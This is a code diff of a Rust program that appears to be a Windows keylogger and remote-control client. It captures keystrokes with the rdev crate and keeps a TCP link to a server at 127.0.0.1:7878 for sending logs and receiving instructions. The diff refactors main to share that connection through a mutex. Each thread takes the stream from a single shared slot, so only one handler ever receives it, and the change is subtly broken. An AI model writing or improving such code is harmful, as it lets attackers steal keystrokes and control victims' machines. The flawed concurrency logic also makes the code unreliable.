@@ -3,6 +3,7 @@ use std::process::Command;
 use std::os::windows::process::CommandExt;
 use std::net::TcpStream;
 use std::thread;
+use std::sync::{Arc, Mutex};
 use rdev::{listen, Event};
 
 fn handle_instructions(mut stream: TcpStream) {
@@ -37,24 +38,38 @@ fn handle_keylogger(mut stream: TcpStream) {
 }
 
 fn main() {
-    let stream = TcpStream::connect("127.0.0.1:7878");
-    
-    match stream {
-        Ok(stream) => {
-            let keylogger_stream = stream.try_clone().unwrap();
-            let instructions_stream = stream.try_clone().unwrap();
+    let stream = Arc::new(
+        Mutex::new(Some(TcpStream::connect("127.0.0.1:7878").expect("could not connect to server")))
+    );
 
-            let keylogger = thread::spawn(|| {
-                handle_keylogger(keylogger_stream);
-            });
+    let stream_clone = Arc::clone(&stream);
+    let keylogger = thread::spawn(move || {
+        let stream = {
+            let mut guard = stream_clone.lock().unwrap();
+            guard.take()
+        };
 
-            let instructions = thread::spawn(|| {
-                handle_instructions(instructions_stream);
-            });
+        let Some(stream) = stream else {
+            return;
+        };
 
-            keylogger.join().unwrap();
-            instructions.join().unwrap();
-        }, 
-        Err(_) => println!("[ERROR] could not connect to server"),
-    }
+        handle_keylogger(stream);
+    });
+
+    let stream_clone = Arc::clone(&stream);
+    let instructions = thread::spawn(move || {
+        let stream = {
+            let mut guard = stream_clone.lock().unwrap();
+            guard.take()
+        };
+
+        let Some(stream) = stream else {
+            return;
+        };
+
+        handle_instructions(stream);
+    });
+
+    keylogger.join().unwrap();
+    instructions.join().unwrap();
 }
